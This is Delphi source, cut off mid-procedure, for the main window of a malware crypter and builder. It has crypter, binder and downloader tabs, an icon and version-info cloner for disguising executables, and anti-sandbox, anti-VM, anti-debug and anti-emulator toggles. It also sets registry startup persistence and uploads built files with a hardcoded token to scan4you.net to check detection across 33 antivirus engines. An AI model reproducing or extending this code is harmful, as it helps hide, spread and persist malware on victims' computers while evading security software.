unit U_FrmMain;

interface
{$I Build.inc}

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, bsSkinData, BusinessSkinForm, AdvPolyPager, GDIPImageTextItem,
  GDIPImageItem, GDIPCustomItem, GDIPTextItem, GDIPSectionItem,
  GDIPImageSectionItem, ComCtrls, bsSkinCtrls, GDIPHTMLSectionItem,
  CustomItemsContainer, AdvPolyList, GDIPImageTextButtonItem, bsSkinTabs,
  ImgList, bsPngImageList, StdCtrls, Mask, bsSkinBoxCtrls, se_effect, se_ani,
  Menus, bsSkinMenus, bsMessages, ExtCtrls, bsSkinShellCtrls, bsSkinExCtrls,
  OtlTask, OtlTaskControl, IdMultipartFormData, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP, IdGlobalProtocols,
  GDIPImageTextButtonSectionItem, GDIPLargeButtonedItem,  se_controls, Buttons,
  IdAntiFreezeBase, IdAntiFreeze, IdCustomTransparentProxy, IdSocks,
  IdIOHandler, IdIOHandlerSocket, IdIOHandlerStack, IdIntercept, IdLogBase,
  IdLogFile;

type
  TFrm_Main = class(TForm)
    skinform: TbsBusinessSkinForm;
    skindata: TbsSkinData;
    skinstore: TbsCompressedStoredSkin;
    PageManager: TAdvPolyPager;
    Menu_Files: TAdvPolyPage;
    Tab_Mainmenu: TImageSectionItem;
    Tab_Files: TImageItem;
    tab_crypter: TbsSkinTabSheet;
    tab_binder: TbsSkinTabSheet;
    tab_downloader: TbsSkinTabSheet;
    Page_Files: TbsSkinPageControl;
    edit_cryptfile: TbsSkinEdit;
    btn_opencrypt: TbsSkinButton;
    FM_ImageList48: TbsPngImageList;
    FM_InfoCrypter: TbsSkinPanel;
    FM_ImageCrypter: TbsPngImageView;
    FM_LabelCrypter: TbsSkinStdLabel;
    FM_LabelInfoCrypt: TbsSkinStdLabel;
    edit_cryptenc: TbsSkinComboBox;
    edit_cryptcomp: TbsSkinComboBox;
    edit_cryptparam: TbsSkinEdit;
    edit_cryptrun: TbsSkinComboBox;
    FM_Anime: TseAnimationList;
    FormExecute_Show: TseAnimation;
    FormExecute_Hide: TseAnimation;
    FM_InfoBinder: TbsSkinPanel;
    FM_ImageBinder: TbsPngImageView;
    FM_LabelBinder: TbsSkinStdLabel;
    FM_LabelInfoBinder: TbsSkinStdLabel;
    FM_Binder: TbsSkinPanel;
    List_Binder: TbsSkinListView;
    Scroll_BinVer: TbsSkinScrollBar;
    FM_InfoDownloader: TbsSkinPanel;
    FM_ImageDown: TbsPngImageView;
    FM_LabelDown: TbsSkinStdLabel;
    FM_LabelInfoDown: TbsSkinStdLabel;
    FM_Downloader: TbsSkinPanel;
    List_Downloader: TbsSkinListView;
    Scroll_DownVer: TbsSkinScrollBar;
    PopUp_Binder: TbsSkinPopupMenu;
    Add1: TMenuItem;
    Edit1: TMenuItem;
    N1: TMenuItem;
    DeleteFromList1: TMenuItem;
    ClearList1: TMenuItem;
    FM_Message: TbsSkinMessage;
    PopUp_Down: TbsSkinPopupMenu;
    Add2: TMenuItem;
    Edit2: TMenuItem;
    N2: TMenuItem;
    DeleteFromList2: TMenuItem;
    ClearList2: TMenuItem;
    Tab_Cloner: TImageItem;
    Menu_Clonner: TAdvPolyPage;
    Tab_Misc: TImageItem;
    Tab_Build: TImageItem;
    Tab_About: TImageItem;
    Menu_Misc: TAdvPolyPage;
    Menu_Build: TAdvPolyPage;
    Menu_About: TAdvPolyPage;
    clonnerpanel: TbsSkinPanel;
    FM_InfoClone: TbsSkinPanel;
    FM_ImageClone: TbsPngImageView;
    FM_LabelClone: TbsSkinStdLabel;
    FM_LabelInfoClone: TbsSkinStdLabel;
    FM_ImageList32: TbsPngImageList;
    bsSkinStdLabel8: TbsSkinStdLabel;
    Edit_CloneSource: TbsSkinEdit;
    btn_openclone: TbsSkinButton;
    bsSkinStdLabel9: TbsSkinStdLabel;
    Check_CloneVersion: TbsSkinCheckRadioBox;
    Check_CloneIcon: TbsSkinCheckRadioBox;
    Check_CloneSign: TbsSkinCheckRadioBox;
    iconstorage: TbsSkinGroupBox;
    Image1: TImage;
    bsSkinStdLabel10: TbsSkinStdLabel;
    bsSkinPanel2: TbsSkinPanel;
    List_icon: TbsSkinListView;
    Scroll_VIcon: TbsSkinScrollBar;
    VersionInfo: TbsSkinGroupBox;
    Scroll_VInfo: TbsSkinScrollBar;
    List_VInfo: TbsSkinListView;
    opendialog: TbsSkinOpenDialog;
    PopUp_Icon: TbsSkinPopupMenu;
    add3: TMenuItem;
    N3: TMenuItem;
    DeleteFromList3: TMenuItem;
    ClearList3: TMenuItem;
    ImageList1: TImageList;
    Select1: TMenuItem;
    Page_Misc: TbsSkinPageControl;
    tab_antis: TbsSkinTabSheet;
    bsSkinPanel1: TbsSkinPanel;
    bsPngImageView1: TbsPngImageView;
    bsSkinStdLabel14: TbsSkinStdLabel;
    bsSkinStdLabel15: TbsSkinStdLabel;
    tab_message: TbsSkinTabSheet;
    bsSkinPanel3: TbsSkinPanel;
    bsPngImageView2: TbsPngImageView;
    bsSkinStdLabel16: TbsSkinStdLabel;
    bsSkinStdLabel17: TbsSkinStdLabel;
    tab_startup: TbsSkinTabSheet;
    bsSkinPanel5: TbsSkinPanel;
    bsPngImageView3: TbsPngImageView;
    bsSkinStdLabel18: TbsSkinStdLabel;
    bsSkinStdLabel19: TbsSkinStdLabel;
    Check_AntiSandbox: TbsSkinCheckRadioBox;
    Check_AntiVM: TbsSkinCheckRadioBox;
    Check_AntiDebug: TbsSkinCheckRadioBox;
    Check_AntiMonitor: TbsSkinCheckRadioBox;
    Check_AntiEmulator: TbsSkinCheckRadioBox;
    Group_message: TbsSkinGroupBox;
    bsSkinStdLabel20: TbsSkinStdLabel;
    bsSkinStdLabel26: TbsSkinStdLabel;
    bsSkinStdLabel27: TbsSkinStdLabel;
    bsSkinStdLabel28: TbsSkinStdLabel;
    bsSkinStdLabel29: TbsSkinStdLabel;
    messagetype: TbsSkinComboBox;
    messagecaption: TbsSkinEdit;
    messagetext: TbsSkinEdit;
    messageicon: TbsSkinComboBox;
    messagebutton: TbsSkinComboBox;
    messagetest: TbsSkinButton;
    Check_Activex: TbsSkinCheckRadioBox;
    Edit_Activex: TbsSkinEdit;
    Edit_Policies: TbsSkinEdit;
    Check_Policies: TbsSkinCheckRadioBox;
    Edit_HKCU: TbsSkinEdit;
    Check_HKCU: TbsSkinCheckRadioBox;
    Edit_HKLM: TbsSkinEdit;
    Check_HKLM: TbsSkinCheckRadioBox;
    Label_HKLM: TbsSkinStdLabel;
    Label_HKCU: TbsSkinStdLabel;
    Label_Policies: TbsSkinStdLabel;
    Label_Activex: TbsSkinStdLabel;
    bsSkinPanel4: TbsSkinPanel;
    savedialog: TbsSkinSaveDialog;
    page_build: TbsSkinPageControl;
    tab_config: TbsSkinTabSheet;
    bsSkinPanel6: TbsSkinPanel;
    bsPngImageView4: TbsPngImageView;
    bsSkinStdLabel30: TbsSkinStdLabel;
    bsSkinStdLabel31: TbsSkinStdLabel;
    tab_exbuild: TbsSkinTabSheet;
    bsSkinPanel7: TbsSkinPanel;
    bsPngImageView5: TbsPngImageView;
    bsSkinStdLabel32: TbsSkinStdLabel;
    bsSkinStdLabel33: TbsSkinStdLabel;
    tab_avscan: TbsSkinTabSheet;
    bsSkinPanel8: TbsSkinPanel;
    bsPngImageView6: TbsPngImageView;
    bsSkinStdLabel43: TbsSkinStdLabel;
    bsSkinStdLabel44: TbsSkinStdLabel;
    ListBox_BuildLog: TbsSkinOfficeListBox;
    ProgressBuild: TbsSkinGauge;
    btn_StartBuild: TbsSkinButton;
    check_PE1: TbsSkinCheckRadioBox;
    check_PE2: TbsSkinCheckRadioBox;
    check_PE3: TbsSkinCheckRadioBox;
    bsSkinStdLabel22: TbsSkinStdLabel;
    bsSkinStdLabel23: TbsSkinStdLabel;
    bsSkinStdLabel24: TbsSkinStdLabel;
    check_Misc1: TbsSkinCheckRadioBox;
    check_Misc2: TbsSkinCheckRadioBox;
    check_pacthPeb: TbsSkinCheckRadioBox;
    avresult: TbsSkinOfficeListBox;
    Scan: TbsSkinButton;
    bsSkinStdLabel21: TbsSkinStdLabel;
    bsSkinStdLabel35: TbsSkinStdLabel;
    bsSkinStdLabel36: TbsSkinStdLabel;
    bsSkinDivider1: TbsSkinDivider;
    bsPngImageView11: TbsPngImageView;
    bsPngImageView7: TbsPngImageView;
    bsPngImageView8: TbsPngImageView;
    bsSkinStdLabel40: TbsSkinStdLabel;
    bsPngImageView9: TbsPngImageView;
    bsPngImageView10: TbsPngImageView;
    bsSkinStdLabel41: TbsSkinStdLabel;
    bsPngImageView12: TbsPngImageView;
    bsSkinStdLabel42: TbsSkinStdLabel;
    bsPngImageView13: TbsPngImageView;
    bsSkinStdLabel37: TbsSkinStdLabel;
    bsPngImageView14: TbsPngImageView;
    bsSkinStdLabel38: TbsSkinStdLabel;
    bsPngImageView15: TbsPngImageView;
    bsSkinStdLabel39: TbsSkinStdLabel;
    bsPngImageView16: TbsPngImageView;
    bsSkinStdLabel45: TbsSkinStdLabel;
    bsPngImageView17: TbsPngImageView;
    bsSkinStdLabel46: TbsSkinStdLabel;
    bsPngImageView18: TbsPngImageView;
    bsSkinStdLabel47: TbsSkinStdLabel;
    bsPngImageView19: TbsPngImageView;
    bsSkinStdLabel48: TbsSkinStdLabel;
    bsPngImageView20: TbsPngImageView;
    bsSkinStdLabel49: TbsSkinStdLabel;
    bsPngImageView21: TbsPngImageView;
    bsSkinStdLabel50: TbsSkinStdLabel;
    bsPngImageView22: TbsPngImageView;
    bsSkinStdLabel51: TbsSkinStdLabel;
    bsPngImageView23: TbsPngImageView;
    bsSkinStdLabel52: TbsSkinStdLabel;
    bsPngImageView24: TbsPngImageView;
    bsSkinStdLabel53: TbsSkinStdLabel;
    bsPngImageView25: TbsPngImageView;
    bsSkinStdLabel54: TbsSkinStdLabel;
    bsPngImageView26: TbsPngImageView;
    bsSkinStdLabel55: TbsSkinStdLabel;
    bsSkinDivider2: TbsSkinDivider;
    seXLabel1: TseXLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label3: TLabel;
    Label2: TLabel;
    Label1: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    Label10: TLabel;
    Label11: TLabel;
    ProgressScan: TbsSkinGauge;
    IdAntiFreeze1: TIdAntiFreeze;
    check_CopyEof: TbsSkinCheckRadioBox;
    Edit_filetostub: TbsSkinComboBox;
    check_logbuild: TbsSkinCheckRadioBox;
    check_proxy: TbsSkinCheckRadioBox;
    Label12: TLabel;
    procedure edit_cryptrunChange(Sender: TObject);
    procedure Add1Click(Sender: TObject);
    procedure Edit1Click(Sender: TObject);
    procedure DeleteFromList1Click(Sender: TObject);
    procedure ClearList1Click(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Add2Click(Sender: TObject);
    procedure Edit2Click(Sender: TObject);
    procedure btn_opencryptClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure btn_opencloneClick(Sender: TObject);
    procedure DeleteFromList2Click(Sender: TObject);
    procedure ClearList2Click(Sender: TObject);
    procedure add3Click(Sender: TObject);
    procedure Select1Click(Sender: TObject);
    procedure DeleteFromList3Click(Sender: TObject);
    procedure ClearList3Click(Sender: TObject);
    procedure Group_messageChecked(Sender: TObject);
    procedure messageiconChange(Sender: TObject);
    procedure messagebuttonChange(Sender: TObject);
    procedure messagetestClick(Sender: TObject);
    procedure Check_HKLMClick(Sender: TObject);
    procedure Check_HKCUClick(Sender: TObject);
    procedure Check_PoliciesClick(Sender: TObject);
    procedure Check_ActivexClick(Sender: TObject);
    procedure Edit_ActivexClick(Sender: TObject);
    procedure Tab_FilesItemClick(Sender: TObject; Item: TCustomItem);
    procedure Tab_MiscItemClick(Sender: TObject; Item: TCustomItem);
    procedure btn_StartBuildClick(Sender: TObject);
    procedure HttpWork(ASender: TObject; AWorkMode: TWorkMode; AWorkCount: Int64);
    procedure HttpWorkBegin(ASender: TObject; AWorkMode: TWorkMode;  AWorkCountMax: Int64);
    procedure ScanClick(Sender: TObject);
    procedure Edit_filetostubChange(Sender: TObject);
    procedure check_proxyClick(Sender: TObject);
  private
    { Private declarations }
    selectediconindex : integer;
    selectedicon :string;
    Procedure AddIcon(filename:string);
    procedure Selecticonlist(list:Tlistitem);
    procedure selecticon(icon:Ticon);
    procedure UpdateStatus(status:string;progress:integer);
    Procedure Build(const projectname,dirpath:string);
    function ProcessData(Data:ansistring):ansistring;
  public
    { Public declarations }
    Function ScanFIle(filename:string;Id:integer):string;
    function CHeckProxy(ptype:integer;Host:string;Port:integer;user,pass:string):boolean;
  end;

var
  Frm_Main: TFrm_Main;
  iButton,iIcon :Dword;

implementation

{$R *.dfm}
{$R resources.RES}

uses
{$IFDEF DebugMode}codesitelogging,{$ENDIF}
U_FrmExecute, U_FrmDrop, U_FrmBinder, U_FrmDownloader, U_FrmResource, U_FrmSections,
U_Frm_Proxy,
U_PEUtils,U_Type, U_Utils, U_Chiper,U_Compiler, U_RetCompress, U_SmallZlib, U_Encryption,
U_Engine, U_HashList,U_Cloner,StreamHelper,U_ThreadHandle,U_Hardwareid;

type
  PMyIcon = ^TmyIcon;
  TMyIcon = record
    Filename :String[255];
    IconName :String[255];
  end;

const
pattern1 = '<div align="center" style="font-family:Arial, Helvetica, sans-serif; font-size:36px; color:#694404"><b>';
pattern2 = 'Country Name:</b>';

Function TFrm_Main.CHeckProxy(ptype:integer;Host:string;Port:integer;user,pass:string):boolean;
var
  Fhttp: TIdHTTP;
  IdSocksInfo : TIdSocksInfo;
  Fhandler : TIdIOHandlerStack;
  html :string;
  d : integer;
  ip,country : string;
begin
  result := false;
  application.ProcessMessages;
  Fhttp := TIdHTTP.Create(nil);
  Fhandler := TIdIOHandlerStack.Create(nil);
  Fhttp.IOHandler := Fhandler;
  IdSocksInfo := nil;
  try
    if (Host <> '') and (Port<>0) then
    begin
      if (ptype = 0) then
      begin
        Fhttp.ProxyParams.ProxyServer := Host;
        Fhttp.ProxyParams.ProxyPort := Port;
        if (user <> '') and (pass <> '') then
        begin
          Fhttp.ProxyParams.BasicAuthentication := true;
          Fhttp.ProxyParams.ProxyUsername := user;
          Fhttp.ProxyParams.ProxyPassword := pass;
        end;
      end else
      begin
        IdSocksInfo := TIdSocksInfo.Create(nil);
        IdSocksInfo.Host := Host;
        IdSocksInfo.Port := port;
        if (user <> '') and (pass <> '') then
        begin
          IdSocksInfo.Authentication := saUsernamePassword;
          IdSocksInfo.Username := user;
          IdSocksInfo.Password := pass;
        end else
        begin
          IdSocksInfo.Authentication := saNoAuthentication;
        end;
        case ptype of
          1 : IdSocksInfo.Version := svSocks4;
          2 : IdSocksInfo.Version := svSocks4A;
          3 : IdSocksInfo.Version := svSocks5;
        end;
        Fhandler.TransparentProxy := IdSocksInfo;
      end;
      Fhttp.HandleRedirects := true;
      Fhttp.Request.Connection := 'close';
      Fhttp.ReadTimeout := 50000;
      try
        html := Fhttp.get('http://get-myip.com/');
        d := pos(pattern1,html);
        if (d<>0) then
        begin
          delete(html,1,d+length(pattern1));
          ip := copy(html,1,pos('</b></div>',html)-1);
        end;
        d := pos(pattern2,html);
        if (d<>0) then
        begin
          delete(html,1,d+length(pattern2));
          country := copy(html,1,pos('<br>',html)-1);
        end;
        result := (ip<>'') and (country <> '');
      Except
      end;
    end;
  finally
    if assigned(IdSocksInfo) then IdSocksInfo.Free;
    if assigned(Fhandler) then Fhandler.Free;
    if assigned(Fhttp) then Fhttp.Free;
  end;
end;

procedure TFrm_Main.HttpWorkBegin(ASender: TObject; AWorkMode: TWorkMode;  AWorkCountMax: Int64);
begin
  ProgressScan.MaxValue := AWorkCountMax;
end;

procedure TFrm_Main.HttpWork(ASender: TObject; AWorkMode: TWorkMode; AWorkCount: Int64);
begin
  ProgressScan.Value := AWorkCount;
  ProgressScan.Update;
end;

procedure TFrm_Main.ScanClick(Sender: TObject);
var
i , avcount: integer;
text,av,scanresult : string;
filescanned:string;
begin
  Scan.Enabled := false;
  try
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
    begin
      filescanned := opendialog.FileName;
    end;
  end;
  if filescanned <> '' then
  begin
    text := Scanfile(filescanned,0);
    if (text = '') then exit;
    avresult.Items.Clear;
    avresult.Update;
    with avresult.Items.Add do
    begin
      Caption := 'Start Scan';
      Header := true;
    end;
    avcount := 0;
    for i := 1 to 33 do
    begin
      av := Copy(text,1,pos(':',text)-1);
      delete(text,1,length(av)+1);
      scanresult := Copy(text,1,pos(#10,text)-1);
      delete(text,1,length(scanresult)+1);
      with avresult.Items.Add do
      begin
        Caption := '        '+av + '   :   ' +scanresult;
        if scanresult = 'OK' then ImageIndex := 10
        else begin
            inc(avcount);
            ImageIndex := 11
        end;
      end;
      avresult.Update;
    end;
    with avresult.Items.Add do
    begin
      Caption := 'Scan Finish : '+inttostr(avcount)+'/33';
      Header := true;
    end;
  end;
  finally
    ProgressScan.MaxValue := 100;
    ProgressScan.Value := 50;
    Scan.Enabled := true;
  end;
  ProgressScan.MaxValue := 100;
  ProgressScan.Value := 50;
  Scan.Enabled := true;
end;

Function TFrm_Main.ScanFIle(filename:string;Id:integer):string;
var
  Fhttp: TIdHTTP;
  FMultiStream: TIdMultiPartFormDataStream;
  IdSocksInfo : TIdSocksInfo;
  Fhandler : TIdIOHandlerStack;
  proxyresult : boolean;
begin
  result := '';
  application.ProcessMessages;
  if (FileName <> '') then
  begin
    Fhttp := TIdHTTP.Create(nil);
    FMultiStream := TIdMultiPartFormDataStream.Create;
    Fhandler := TIdIOHandlerStack.Create(nil);
    Fhttp.IOHandler := Fhandler;
    IdSocksInfo := nil;
    if check_proxy.Checked and (settings.Proxy.Host <> '') and (settings.Proxy.port <> 0) then
    begin
      with settings.Proxy do
      begin
        proxyresult := CHeckProxy(ptype,Host,port,user,pass);
        if proxyresult then
        begin
          if (ptype = 0) then
          begin
            Fhttp.ProxyParams.ProxyServer := Host;
            Fhttp.ProxyParams.ProxyPort := Port;
            if (user <> '') and (pass <> '') then
            begin
              Fhttp.ProxyParams.BasicAuthentication := true;
              Fhttp.ProxyParams.ProxyUsername := user;
              Fhttp.ProxyParams.ProxyPassword := pass;
            end;
          end else
          begin
            IdSocksInfo := TIdSocksInfo.Create(nil);
            IdSocksInfo.Host := Host;
            IdSocksInfo.Port := port;
            if (user <> '') and (pass <> '') then
            begin
              IdSocksInfo.Authentication := saUsernamePassword;
              IdSocksInfo.Username := user;
              IdSocksInfo.Password := pass;
            end else
            begin
              IdSocksInfo.Authentication := saNoAuthentication;
            end;
            case ptype of
              1 : IdSocksInfo.Version := svSocks4;
              2 : IdSocksInfo.Version := svSocks4A;
              3 : IdSocksInfo.Version := svSocks5;
            end;
            Fhandler.TransparentProxy := IdSocksInfo;
          end;
        end;
      end;
    end;
    try try
      if id = 0 then
      begin
        ProgressScan.Value := 0;
        Fhttp.OnWork := HttpWork;
        Fhttp.OnWorkBegin := HttpWorkBegin;
      end;
      Fhttp.HandleRedirects := false;
      FMultiStream.AddFormField('id','2503');
      FMultiStream.AddFormField('token','57bf731236047d0fa647');
      FMultiStream.AddFormField('action','file');
      FMultiStream.AddFile('uppload',FileName,GetMIMETypeFromFile(FileName));
      result := Fhttp.Post('http://scan4you.net/remote.php', FMultiStream);
    Except
      on E:Exception do
      begin
        showmessage(E.Message);
      end;
    end;
    finally
      if assigned(Fhandler) then Fhandler.Free;
      if assigned(IdSocksInfo) then IdSocksInfo.Free;
      if assigned(Fhttp) then Fhttp.Free;
      if assigned(FMultiStream) then FMultiStream.Free;
    end;
  end;
end;


procedure TFrm_Main.UpdateStatus(status:string;progress:integer);
var
List : TbsSkinOfficeItem;
begin
  ListBox_BuildLog.Items.BeginUpdate;
  try
    List := ListBox_BuildLog.Items.Add;
    List.Caption := '   '+FormatDateTime('hh:nn:ss ampm',Now)+' : '+status;
    List.ImageIndex := 6;
    ProgressBuild.Value := ProgressBuild.Value + progress;
  finally
    ListBox_BuildLog.Items.EndUpdate;
  end;
  ListBox_BuildLog.ItemIndex := ListBox_BuildLog.Items.Count-1;
  application.ProcessMessages;
end;

procedure TFrm_Main.Add1Click(Sender: TObject);
begin
  Frm_Binder := TFrm_Binder.Create(Application);
  Frm_Binder.FB_Panel.Caption := 'Binder Add';
  Frm_Binder.Left := Frm_Main.Left + 250;
  Frm_Binder.Top := Frm_Main.top + 50;
  Frm_Binder.ShowModal;
  Frm_Binder.Free;
end;

procedure TFrm_Main.Add2Click(Sender: TObject);
begin
  Frm_Downloader := TFrm_Downloader.Create(Application);
  Frm_Downloader.FDW_Panel.Caption := 'Downloader Add';
  Frm_Downloader.Left := Frm_Main.Left + 250;
  Frm_Downloader.Top := Frm_Main.top + 50;
  Frm_Downloader.ShowModal;
  Frm_Downloader.Free;
end;

procedure TFrm_Main.selecticon(icon:Ticon);
begin
  image1.Picture := nil;
  image1.Picture.Assign(icon);
  image1.Refresh;
end;

procedure TFrm_Main.Selecticonlist(list:Tlistitem);
var
picon : PMyIcon;
Icon: TIcon;
iconname : string;
begin
  if assigned(list) and assigned(list.Data) then
  begin
    picon := list.data;
    iconname := string(picon^.IconName);
    if fileexists(iconname) then
    begin
      Icon := TIcon.Create;
      try
        Icon.LoadFromFile(iconname);
        selecticon(icon);
        selectedicon := iconname;
        selectediconindex := list.Index;
      finally
        Icon.Free;
      end;
    end;
  end else begin
    selectedicon := '';
    selectediconindex := -1;
    image1.Picture := nil;
    image1.Refresh;
  end;
end;

procedure TFrm_Main.Tab_FilesItemClick(Sender: TObject; Item: TCustomItem);
begin
  page_files.ActivePage := tab_crypter;
end;

procedure TFrm_Main.Tab_MiscItemClick(Sender: TObject; Item: TCustomItem);
begin
  page_misc.ActivePage := tab_antis;
end;

procedure TFrm_Main.Select1Click(Sender: TObject);
begin
  Selecticonlist(list_icon.Selected);
end;

Procedure TFrm_Main.AddIcon(filename:string);
var
picon : PMyIcon;
TempIcon : string;
Icon: TIcon;
bitmap : TBitmap;
list: TListItem;
begin
  if lowercase(ExtractFileExt(filename)) = '.exe' then
  begin
    TempIcon := TempDir + inttostr(GetTickCount) + '.ico';
    ExtractIcon(filename,TempIcon);
  end else TempIcon := filename;
  if fileexists(TempIcon) then
  begin
    new(picon);
    Icon := TIcon.Create;
    bitmap := TBitmap.Create;
    try
      picon^.Filename := ShortString(filename);
      picon^.IconName := ShortString(TempIcon);
      Icon.LoadFromFile(TempIcon);
      selecticon(icon);
      selectedicon := TempIcon;
      bitmap.Width := 32;
      bitmap.Height := 32;
      bitmap.Canvas.Draw(0,0,Icon);
      list := List_icon.Items.Add;
      list.ImageIndex := ImageList1.Add(bitmap,nil);
      selectediconindex := list.Index;
      list.Data := picon;
    finally
      Icon.Free;
      bitmap.Free;
    end;
  end;
end;

procedure TFrm_Main.add3Click(Sender: TObject);
begin
  opendialog.Filter := 'Icon Files|*.exe;*.ico';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
    begin
      AddIcon(opendialog.FileName);
    end;
  end;
end;

procedure TFrm_Main.btn_opencloneClick(Sender: TObject);
begin
  opendialog.Filter := 'EXE Files|*.exe';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
    begin
      Edit_CloneSource.Text := opendialog.FileName;
      List_VInfo.Items.Item[0].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_COMMENTS);
      List_VInfo.Items.Item[1].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_INTERNALNAME);
      List_VInfo.Items.Item[2].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_PRODUCTNAME);
      List_VInfo.Items.Item[3].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_COMPANYNAME);
      List_VInfo.Items.Item[4].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_LEGALCOPYRIGHT);
      List_VInfo.Items.Item[5].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_PRODUCTVERSION);
      List_VInfo.Items.Item[6].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_FILEDESCRIPTION);
      List_VInfo.Items.Item[7].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_LEGALTRADEMARKS);
      List_VInfo.Items.Item[8].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_PRIVATEBUILD);
      List_VInfo.Items.Item[9].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_FILEVERSION);
      List_VInfo.Items.Item[10].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_ORIGINALFILENAME);
      List_VInfo.Items.Item[11].SubItems[0] := GetFileDetails(Edit_CloneSource.Text,UVI_SPECIALBUILD);
      AddIcon(Edit_CloneSource.Text);
    end;
  end;
end;

procedure TFrm_Main.btn_opencryptClick(Sender: TObject);
begin
  opendialog.Filter := 'EXE Files|*.exe';
  opendialog.FileName := '';
  if opendialog.Execute Then
  begin
    if (opendialog.FileName <> '') and fileexists(opendialog.FileName) then
      edit_cryptfile.Text := opendialog.FileName;
  end;
end;

function ExtractProject(FullName: String): String;
var
i, n: integer;
begin
  n := Length(FullName);
  Result := '';
  for i := n downto 1 do if FullName[i] = '.' then break;
  if i > 1 then Result := Copy(FullName, 1, i-1);
end;

procedure TFrm_Main.btn_StartBuildClick(Sender: TObject);
var
projectname:string;
begin
  {Check Edit_CryptFile not empty}
  if (Edit_CryptFile.Text = '') then
  begin
    FM_Message.MessageDlg('Please Input File You Want Crypt...!!!',mtWarning,[mbOk],0);
    Exit;
  end;
  {Check file in Edit_CryptFile Exists}
  if not Fileexists(Edit_CryptFile.Text) then
  begin
    FM_Message.MessageDlg('Please Input Correct Path File You Want Crypt...!!!',mtWarning,[mbOk],0);
    Exit;
  end;
  savedialog.Filter := 'EXE Files|*.exe';
  savedialog.FileName := '';
  if savedialog.Execute Then
  begin
    if (savedialog.FileName <> '') then
    begin
      if fileexists(savedialog.FileName) then deleteFile(savedialog.FileName);
      projectname := ExtractProject(extractfilename(savedialog.FileName));
      Build(projectname,AddSlash(extractfilepath(savedialog.FileName)));
    end;
  end;
end;

procedure TFrm_Main.Check_ActivexClick(Sender: TObject);
begin
  Label_Activex.Enabled := Check_Activex.Checked;
  Edit_Activex.Enabled := Check_Activex.Checked;
end;

procedure TFrm_Main.Check_HKCUClick(Sender: TObject);
begin
  Label_HKCU.Enabled := Check_HKCU.Checked;
  Edit_HKCU.Enabled := Check_HKCU.Checked;
end;

procedure TFrm_Main.Check_HKLMClick(Sender: TObject);
begin
  Label_HKLM.Enabled := Check_HKLM.Checked;
  Edit_HKLM.Enabled := Check_HKLM.Checked;
end;

procedure TFrm_Main.Check_PoliciesClick(Sender: TObject);
begin
  Label_Policies.Enabled := Check_Policies.Checked;
  Edit_Policies.Enabled := Check_Policies.Checked;
end;

procedure TFrm_Main.check_proxyClick(Sender: TObject);
begin
  if check_proxy.Checked then
  begin
  Frm_Proxy := TFrm_Proxy.Create(Application);
  Frm_Proxy.Caption := 'Proxy Settings';
  Frm_Proxy.Left := Frm_Main.Left + 300;
  Frm_Proxy.Top := Frm_Main.top + 50;
  Frm_Proxy.ShowModal;
  Frm_Proxy.Free;
  end;
end;

procedure TFrm_Main.ClearList1Click(Sender: TObject);
var
i : integer;
begin
  for i := List_Binder.Items.Count -1 downto 0 do
  begin
    if assigned(list_binder.Items.Item[i].Data) then
      dispose(PBinder(list_binder.Items.Item[i].Data));
    list_binder.Items.Delete(i);
  end;
end;

procedure TFrm_Main.ClearList2Click(Sender: TObject);
var
i : integer;
begin
  for i := List_Downloader.Items.Count -1 downto 0 do
  begin
    if assigned(List_Downloader.Items.Item[i].Data) then
      dispose(PBinder(List_Downloader.Items.Item[i].Data));
    List_Downloader.Items.Delete(i);
  end;
end;

procedure TFrm_Main.ClearList3Click(Sender: TObject);
var
i : integer;
myicon :PMyIcon;
begin
  for i := List_icon.Items.Count -1 downto 0 do
  begin
    myicon := PMyIcon(List_icon.Items.Item[i].Data);
    if assigned(myicon) then
    begin
      deletefile(string(myicon^.IconName));
      dispose(myicon);
    end;
    List_icon.Items.Delete(i);
  end;
  selectedicon := '';
  selectediconindex := -1;
  imagelist1.Clear;
end;

procedure TFrm_Main.DeleteFromList1Click(Sender: TObject);
begin
  if (List_Binder.Selected <> nil) then
  begin
    dispose(PBinder(list_binder.Selected.Data));
    List_Binder.DeleteSelected;
  end;
end;

procedure TFrm_Main.DeleteFromList2Click(Sender: TObject);
begin
  if (List_Downloader.Selected <> nil) then
  begin
    dispose(PBinder(List_Downloader.Selected.Data));
    List_Downloader.DeleteSelected;
  end;
end;

procedure TFrm_Main.DeleteFromList3Click(Sender: TObject);
var
myicon :PMyIcon;
begin
  if (List_icon.Selected <> nil) then
  begin
    myicon := PMyIcon(List_icon.Selected.Data);
    if assigned(myicon) then
    begin
      deletefile(string(myicon^.IconName));
      dispose(myicon);
    end;
    if (selectediconindex = list_icon.Selected.Index) then
      Selecticonlist(list_icon.Items.Item[selectediconindex-1]);
    list_icon.DeleteSelected;
  end;
end;

procedure TFrm_Main.Edit1Click(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
begin
  if (List_Binder.Selected <> nil) then
  begin
    List := List_Binder.Selected;
    Data := List.Data;
    Frm_Binder := TFrm_Binder.Create(Application);
    Frm_Binder.FB_Panel.Caption := 'Binder Edit '+Inttostr(List.Index);
    Frm_Binder.FB_EditFile.Text := List.Caption;
    Frm_Binder.FB_EditParam.Text := String(Data^.Parameter);
